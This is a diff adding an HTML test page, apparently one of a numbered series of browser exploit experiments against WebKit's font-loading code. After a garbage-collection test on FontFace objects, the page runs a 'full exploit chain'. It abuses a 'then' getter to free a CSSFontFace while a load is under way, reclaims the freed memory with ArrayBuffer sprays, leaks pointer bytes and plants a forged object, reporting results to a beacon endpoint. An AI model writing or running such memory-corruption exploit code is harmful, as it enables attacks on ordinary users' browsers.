@@ -1,0 +1,370 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1223 loaded GC retest</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
+#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
+#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
+</style>
+</head><body>
+<div id="s">P1223 BOOTING...</div>
+<div id="r"></div>
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════
+   P1223: Retest .loaded GC with PROPER JS-heap pressure
+
+   P1221 tested GC with ArrayBuffer pressure (WRONG HEAP).
+   Teacher says: ArrayBuffer backing → bmalloc, NOT JS heap.
+
+   HYPOTHESIS: gc2 (.loaded, no fonts) might BE collectable if we use
+   JS-heap pressure instead. P1221's "not collected" result might just
+   mean the JS GC never ran.
+
+   TEST: 4 FontFace variants × JS-heap pressure (objects, strings,
+   closures, Maps, Promises) × 30 waves with timeout yields.
+
+   THEN: Full CSSFontFace reclaim WITH .loaded, template fill,
+   drop refs, JS-heap GC → monitor for destructor.
+   ═══════════════════════════════════════════════════════════════════ */
+
+var S=document.getElementById('s'),R=document.getElementById('r');
+function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}
+
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1223-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',m+'@'+l);};
+
+function hex(v){return('0'+v.toString(16)).slice(-2);}
+
+B('START','loaded-gc-retest');
+S.textContent='P1223: GC RETEST...';
+msg('=== P1223: .loaded GC retest with JS-heap pressure ===');
+msg('');
+
+/* ═══════ EXPERIMENT A: 4 FontFace GC variants with JS-heap pressure ═══════ */
+
+var weak={};
+var finResults={};
+var finReg=new FinalizationRegistry(function(tag){
+  finResults[tag]=true;
+  B('FIN-'+tag,'fired');
+  msg('FinReg: '+tag+' COLLECTED');
+});
+
+/* gc1: bare — no .loaded, no document.fonts */
+var f1=new FontFace('gc1','local(Arial)',{unicodeRange:'U+0041'});
+weak.gc1=new WeakRef(f1);
+finReg.register(f1,'gc1');
+f1=null;
+
+/* gc2: .loaded only — no document.fonts */
+var f2=new FontFace('gc2','local(Arial)',{unicodeRange:'U+0042'});
+weak.gc2=new WeakRef(f2);
+finReg.register(f2,'gc2');
+void f2.loaded;
+f2=null;
+
+/* gc3: added+deleted — no .loaded */
+var f3=new FontFace('gc3','local(Arial)',{unicodeRange:'U+0043'});
+weak.gc3=new WeakRef(f3);
+finReg.register(f3,'gc3');
+document.fonts.add(f3);
+document.fonts.delete(f3);
+f3=null;
+
+/* gc4: .loaded + added+deleted (full lifecycle like our exploit) */
+var f4=new FontFace('gc4','local(Arial)',{unicodeRange:'U+0044'});
+weak.gc4=new WeakRef(f4);
+finReg.register(f4,'gc4');
+document.fonts.add(f4);
+void f4.loaded;
+document.fonts.delete(f4);
+f4=null;
+
+/* gc5: .loaded + load() called explicitly + deleted */
+var f5=new FontFace('gc5','local(Arial)',{unicodeRange:'U+0045'});
+weak.gc5=new WeakRef(f5);
+finReg.register(f5,'gc5');
+document.fonts.add(f5);
+try{f5.load();}catch(e){}
+document.fonts.delete(f5);
+f5=null;
+
+/* gc6: .loaded accessed, wait 500ms, THEN null */
+var f6=new FontFace('gc6','local(Arial)',{unicodeRange:'U+0046'});
+weak.gc6=new WeakRef(f6);
+finReg.register(f6,'gc6');
+void f6.loaded;
+
+B('REGISTERED','6-variants');
+msg('6 FontFace GC variants created and released (except gc6)');
+
+/* Null gc6 after a delay (let the resolved promise settle) */
+setTimeout(function(){f6=null;B('GC6-NULLED','ok');},500);
+
+/* ═══════ JS-HEAP GC PRESSURE ═══════ */
+var wave=0;
+var maxWaves=40;
+
+function jsHeapPressure(){
+  /* Objects, strings, closures, Maps, Symbols — JS heap objects! */
+  var junk=[];
+  for(var i=0;i<5000;i++){
+    junk.push({
+      a:i,
+      b:'gc_pressure_'+i+'_'+Math.random().toString(36),
+      c:[i,i+1,i+2],
+      d:function(){return i*2;},
+    });
+  }
+  for(var i=0;i<3000;i++){
+    junk.push('str_'+i+'_'.repeat(40)+Math.random());
+  }
+  for(var i=0;i<1000;i++){
+    junk.push(new Map([[i,'v'+i],[i+1,'v'+(i+1)]]));
+  }
+  for(var i=0;i<500;i++){
+    junk.push(Promise.resolve(i));
+  }
+  for(var i=0;i<500;i++){
+    junk.push((function(x){return function(){return x;};})(i));
+  }
+  junk=null;
+
+  wave++;
+
+  /* Check all WeakRefs */
+  var alive={};
+  for(var k in weak){
+    alive[k]=weak[k].deref()!==undefined;
+  }
+
+  /* Report every 5 waves */
+  if(wave%5===0||wave===1){
+    var status=[];
+    for(var k in alive)status.push(k+'='+(alive[k]?'ALIVE':'DEAD'));
+    B('WAVE-'+wave,status.join('|'));
+    msg('wave '+wave+': '+status.join(' '));
+  }
+
+  /* Check if all are dead */
+  var allDead=true;
+  for(var k in alive)if(alive[k])allDead=false;
+
+  if(allDead){
+    B('ALL-DEAD','wave='+wave);
+    msg('ALL variants collected at wave '+wave+'!');
+    afterGcTest();
+    return;
+  }
+
+  if(wave<maxWaves){
+    setTimeout(jsHeapPressure,20);
+  }else{
+    /* Final report */
+    var finalStatus=[];
+    for(var k in alive)finalStatus.push(k+'='+(alive[k]?'ALIVE':'DEAD'));
+    B('GC-FINAL',finalStatus.join('|')+'|wave='+wave);
+    msg('FINAL after '+wave+' waves: '+finalStatus.join(' '));
+    afterGcTest();
+  }
+}
+
+/* Start GC pressure after gc6 is nulled */
+setTimeout(function(){
+  msg('');msg('starting JS-heap GC pressure...');
+  jsHeapPressure();
+},700);
+
+/* ═══════ AFTER GC TEST: Full exploit chain ═══════ */
+function afterGcTest(){
+  msg('');msg('=== PART 2: Full exploit chain ===');
+  B('PART2-START','go');
+  S.textContent='P1223: EXPLOIT CHAIN...';
+
+  /* Stage 1: CSSFontFace reclaim */
+  var K=8,SIZE=192;
+  var s1data=null;
+
+  var styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0047;}";
+  document.head.appendChild(styleEl);
+  var A0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A0);
+  void A0.loaded;
+  window.__alive=[A0];
+
+  var firedS1=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedS1)return undefined;
+      firedS1=true;
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      styleEl=null;
+      document.body.offsetHeight;
+      window.__map1=[];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(SIZE);
+        window.__map1.push({view:new Uint8Array(ab),bv:new BigUint64Array(ab)});
+      }
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  document.fonts.load('1em f0, s0','AG').then(function(){
+    B('EXP-S1-OK','resolved');
+  },function(){});
+
+  setTimeout(function(){
+    var m=window.__map1;
+    if(!m||!m.length){B('EXP-S1-NOMAP','err');finalize();return;}
+    var best=-1,nz=0;
+    for(var i=0;i<m.length;i++){
+      var v=m[i].view,n=0;
+      for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+      if(n>nz){nz=n;best=i;}
+    }
+    if(best<0){B('EXP-S1-CLEAN','no-hit');finalize();return;}
+
+    s1data=new Uint8Array(SIZE);
+    for(var i=0;i<SIZE;i++)s1data[i]=m[best].view[i];
+
+    var p58='';for(var i=0;i<8;i++)p58+=hex(s1data[0x58+i]);
+    var p68='';for(var i=0;i<8;i++)p68+=hex(s1data[0x68+i]);
+    B('EXP-S1-HIT','p58='+p58+'|p68='+p68);
+    msg('S1 HIT: p58='+p58+' p68='+p68);
+
+    /* Stage 2: Template with .loaded (needed for then-getter) */
+    var styleEl2=document.createElement('style');
+    styleEl2.textContent="@font-face{font-family:s1;src:local(Arial);unicode-range:U+0048;}";
+    document.head.appendChild(styleEl2);
+    var A1=new FontFace('f1','local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(A1);
+    void A1.loaded; /* MUST access for then-getter to fire */
+
+    /* Track A1 for GC */
+    var weakA1=new WeakRef(A1);
+    var a1Collected=false;
+    finReg.register(A1,'exploit-f1');
+
+    var firedS2=false;
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(firedS2)return undefined;
+        firedS2=true;
+        if(styleEl2)styleEl2.remove();
+        try{document.fonts.delete(this);}catch(e){}
+        styleEl2=null;
+        document.body.offsetHeight;
+        window.__map2=[];
+        for(var k=0;k<K;k++){
+          var ab=new ArrayBuffer(SIZE);
+          var v=new Uint8Array(ab);
+          for(var j=0;j<SIZE;j++)v[j]=s1data[j]; /* copy full layout */
+          v[0]=1;v[1]=0;v[2]=0;v[3]=0; /* refcount=1 */
+          window.__map2.push({view:v,ab:ab,bv:new BigUint64Array(ab)});
+        }
+        try{document.fonts.check('1em s1');}catch(e){}
+        return undefined;
+      },
+      set:function(){}
+    });
+
+    document.fonts.load('1em f1, s1','AH').then(function(){
+      B('EXP-S2-OK','resolved');
+
+      var m2=window.__map2;
+      var tIdx=-1;
+      for(var i=0;i<m2.length;i++){
+        if(m2[i].view[0]===1){tIdx=i;break;}
+      }
+      if(tIdx<0){B('EXP-S2-NOHIT','err');finalize();return;}
+      B('EXP-S2-FOUND','buf'+tIdx);
+      msg('S2 template at buf'+tIdx);
+
+      var tv=m2[tIdx].view;
+      var snap=new Uint8Array(SIZE);
+      for(var i=0;i<SIZE;i++)snap[i]=tv[i];
+
+      /* ═══ STAGE 3: Drop refs + JS-heap GC ═══ */
+      A1=null;
+      window.__a1=null;
+
+      var gcw=0;
+      function exploitGc(){
+        var j=[];
+        for(var i=0;i<8000;i++){
+          j.push({a:i,b:'x'+i+'_'.repeat(30)+Math.random(),c:[i],d:function(){return i;}});
+        }
+        for(var i=0;i<2000;i++)j.push(new Map([[i,'v'+i]]));
+        for(var i=0;i<1000;i++)j.push(Promise.resolve(i));
+        j=null;
+        gcw++;
+
+        var alive=weakA1.deref()!==undefined;
+        var rc=tv[0]|(tv[1]<<8)|(tv[2]<<16)|(tv[3]<<24);
+        var diffs=0;
+        for(var i=0;i<SIZE;i++)if(tv[i]!==snap[i])diffs++;
+
+        if(!alive||diffs>0){
+          B('EXP-S3-EVENT','w='+gcw+'|alive='+alive+'|rc='+rc+'|diffs='+diffs);
+          msg('WAVE '+gcw+': alive='+alive+' rc='+rc+' diffs='+diffs);
+
+          if(!alive){
+            /* COLLECTED! Dump the changes */
+            var allDiffs=[];
+            for(var i=0;i<SIZE;i++){
+              if(tv[i]!==snap[i])allDiffs.push('+0x'+hex(i>>4)+hex(i&0xf)+'='+hex(snap[i])+'->'+hex(tv[i]));
+            }
+            B('EXP-COLLECTED','w='+gcw+'|rc='+rc+'|diffs='+allDiffs.join(',').slice(0,800));
+            msg('*** COLLECTED! rc='+rc+' diffs: '+allDiffs.join(','));
+
+            var postDump='';
+            for(var i=0;i<64;i++)postDump+=hex(tv[i]);
+            B('EXP-POSTDUMP',postDump);
+
+            finalize();
+            return;
+          }
+        }
+
+        if(gcw<50){
+          setTimeout(exploitGc,20);
+        }else{
+          B('EXP-S3-TIMEOUT','alive='+alive+'|rc='+rc+'|diffs='+diffs);
+          msg('GC timeout. alive='+alive+' rc='+rc);
+          finalize();
+        }
+      }
+
+      msg('');msg('=== Stage 3: GC destructor ===');
+      exploitGc();
+
+    },function(){B('EXP-S2-FAIL','rejected');finalize();});
+
+  },100);
+}
+
+function finalize(){
+  msg('');msg('=== P1223 COMPLETE ===');
+  S.textContent='P1223 COMPLETE';
+  B('DONE','all');
+}
+
+setTimeout(finalize,60000);
+</script>
+</body></html>
